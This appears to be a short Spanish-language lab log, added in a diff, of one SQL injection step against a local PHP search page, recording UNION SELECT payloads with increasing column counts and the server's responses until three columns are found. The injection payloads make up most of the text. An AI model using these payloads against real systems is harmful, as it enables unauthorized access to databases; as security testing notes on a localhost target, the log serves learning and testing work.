@@ -1,0 +1,14 @@
+# 03 - Determinacion del numero de columnas de la consulta
+Fecha: 2026-10-31 23:15:15
+Objetivo: http://127.0.0.1:8000/buscar.php?q= (GET)
+Metodo: UNION SELECT con numero creciente de columnas hasta que deja de dar error.
+
+----- 1 columna: zzz%' UNION SELECT 1 --  -----
+Fatal error
+----- 2 columnas: zzz%' UNION SELECT 1,2 --  -----
+Fatal error
+----- 3 columnas: zzz%' UNION SELECT 1,2,3 --  -----
+resultado(s) reportados:
+class="resumen">1 resultado(s) para "zzz%&#039; UNION SELECT 1,2,3 -- "
+
+Conclusion: la consulta tiene 3 columnas (nombre, descripcion, precio).
